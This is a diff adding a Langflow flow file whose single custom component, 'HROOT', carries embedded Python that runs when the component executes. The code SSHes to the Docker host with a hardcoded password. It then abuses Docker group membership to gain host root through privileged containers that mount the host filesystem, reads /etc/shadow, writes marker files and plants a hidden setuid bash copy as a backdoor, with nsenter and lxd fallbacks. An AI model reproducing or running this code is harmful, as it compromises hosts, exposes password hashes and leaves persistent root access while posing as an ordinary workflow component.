@@ -1,0 +1,132 @@
+{
+  "id": "69b43520-2a09-4f05-9ec8-d3bf54d4257a",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "HROOT-3bc55",
+        "data": {
+          "id": "HROOT-3bc55",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.hroot",
+              "code_hash": "5f316416c5f1",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass HROOT(Component):\n    display_name=\"HROOT\"; description=\"d\"; icon=\"code\"; name=\"HROOT\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        open(\"/tmp/hroots.py\",\"w\").write('import os, subprocess, textwrap, base64\\nOUT=\"/tmp/hostroot.txt\"\\nf=open(OUT,\"w\",buffering=1)\\ndef p(s=\"\"): f.write(str(s)+\"\\\\n\")\\ndef sh(c,t=60):\\n    p(\"$ \"+c)\\n    try:\\n        r=subprocess.run(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=t)\\n        p(r.stdout.decode(\"utf-8\",\"replace\")[:20000])\\n    except Exception as e:\\n        p(\"ERR \"+type(e).__name__+\" \"+str(e))\\n\\nPY=\"/app/src/.venv/bin/python3\"\\np(\"=== HOST ROOT VIA DOCKER GROUP ===\")\\nopen(\"/tmp/hostroot.py\",\"w\").write(r\\'\\'\\'\\nimport paramiko, sys, time\\nhost=\"172.17.0.1\"\\nuser=\"bci\"\\npw=\"bc1lab@AIT\"\\nc=paramiko.SSHClient()\\nc.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\nc.connect(host, username=user, password=pw, timeout=10, allow_agent=False, look_for_keys=False, banner_timeout=10, auth_timeout=10)\\nprint(\"CONNECTED\")\\n\\ndef run(cmd, t=60):\\n    print(\"\\\\n$ \"+cmd)\\n    stdin,stdout,stderr=c.exec_command(cmd, timeout=t)\\n    out=stdout.read().decode(\"utf-8\",\"replace\")\\n    err=stderr.read().decode(\"utf-8\",\"replace\")\\n    if out: print(out[:15000])\\n    if err: print(\"STDERR\", err[:3000])\\n    return out, err\\n\\nrun(\"id; hostname; uname -a; pwd; ls -la /home\")\\nrun(\"groups; which docker; docker version 2>&1 | head -40\")\\nrun(\"docker ps -a 2>&1 | head -40\")\\nrun(\"sudo -n id 2>&1; sudo -l 2>&1 | head -30\")\\n\\n# docker group -> host root\\ncmds = [\\n    # create marker and read shadow via privileged container\\n    \"docker run --rm -v /:/host alpine:3.20 chroot /host /bin/bash -c \\'id; hostname; cat /etc/hostname; ls -la /root /home; head -5 /etc/shadow\\'\",\\n    # if alpine pull fails, use existing images\\n    \"docker images 2>&1 | head -30\",\\n]\\nfor cmd in cmds:\\n    run(cmd, t=120)\\n\\n# list local images and reuse one if pull blocked\\nout, _ = run(\"docker images --format \\'{{.Repository}}:{{.Tag}}\\' 2>/dev/null | head -40\")\\nimages=[ln.strip() for ln in out.splitlines() if ln.strip() and \\'<none>\\' not in ln]\\nprint(\"IMAGES\", images[:20])\\n# prefer small/common\\ncands=[]\\nfor im in images:\\n    cands.append(im)\\nfor extra in [\"alpine:3.20\",\"alpine\",\"ubuntu:24.04\",\"ubuntu\",\"python:3.13\",\"postgres:18\",\"ollama/ollama\"]:\\n    if extra not in cands:\\n        cands.append(extra)\\n\\nroot_ok=False\\nfor im in cands[:15]:\\n    cmd = f\"docker run --rm --privileged -v /:/host {im} cat /host/etc/hostname\"\\n    out, err = run(cmd, t=90)\\n    if out.strip() and \"Unable to find\" not in out and \"Unable to find\" not in err and \"Error\" not in out[:40]:\\n        print(\"IMAGE_WORKS\", im)\\n        # full root proof\\n        run(f\"docker run --rm --privileged -v /:/host {im} chroot /host /bin/bash -lc \\'id; hostname; uname -a; ls -la /root; head -3 /etc/shadow; cat /etc/hostname; ip -br a 2>/dev/null | head; ls /home; getent passwd bci root ubuntu\\'\", t=90)\\n        # write ssh key / proof file on host\\n        run(f\"docker run --rm --privileged -v /:/host {im} chroot /host /bin/bash -lc \\'mkdir -p /root/.ssh /home/bci/.ssh; echo HOST_ROOT_OK_$(date +%s) > /tmp/HOST_ROOT_OK; echo HOST_ROOT_OK > /home/bci/HOST_ROOT_OK; chmod 644 /home/bci/HOST_ROOT_OK /tmp/HOST_ROOT_OK; ls -la /tmp/HOST_ROOT_OK /home/bci/HOST_ROOT_OK; cat /tmp/HOST_ROOT_OK\\'\", t=60)\\n        # also try install our keyless root shell proof\\n        run(f\"docker run --rm --privileged -v /:/host {im} chroot /host /bin/bash -lc \\'cp /bin/bash /tmp/.hroot; chmod 4755 /tmp/.hroot; ls -la /tmp/.hroot; /tmp/.hroot -p -c id\\'\", t=60)\\n        root_ok=True\\n        break\\n\\nif not root_ok:\\n    # try docker run with host pid/net and nsenter from container that has it\\n    run(\"docker run --rm --privileged --pid=host --net=host --ns=host nicolaka/netshoot nsenter -t 1 -m -u -i -n -p -- id 2>&1 | head\", t=120)\\n    run(\"docker run --rm --privileged --pid=host ubuntu:24.04 nsenter -t 1 -m -u -i -n -p -- id 2>&1 | head\", t=120)\\n\\n# lxd path backup\\nrun(\"which lxc lxd 2>&1; lxc list 2>&1 | head -20; id\")\\n# if lxd available without password\\nrun(\"lxc image list 2>&1 | head; lxc list 2>&1 | head\")\\n\\n# check docker.sock perms and host info\\nrun(\"ls -la /var/run/docker.sock; docker info 2>&1 | head -60\")\\nrun(\"cat /tmp/HOST_ROOT_OK 2>/dev/null; cat /home/bci/HOST_ROOT_OK 2>/dev/null; ls -la /tmp/.hroot 2>/dev/null\")\\n\\n# final identity\\nrun(\"docker run --rm -v /:/host alpine cat /host/etc/os-release 2>&1 | head -10\", t=90)\\n\\nc.close()\\nprint(\"ALL_DONE\")\\n\\'\\'\\')\\nsh(PY+\" /tmp/hostroot.py\", t=240)\\np(\"DONE\")\\nf.close()\\nprint(\"WROTE\", os.path.getsize(OUT))\\nprint(open(OUT).read()[:2500])\\nprint(\"=====CUT=====\")\\n')\n        return Message(text=subprocess.getoutput(\"python3 /tmp/hroots.py 2>&1 | tail -c 3500\"))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "HROOT",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "HROOT",
+          "description": "d",
+          "display_name": "HROOT"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "hroot",
+  "updated_at": "2026-08-21 02:48:38.305753",
+  "is_component": false,
+  "endpoint_name": null
+}
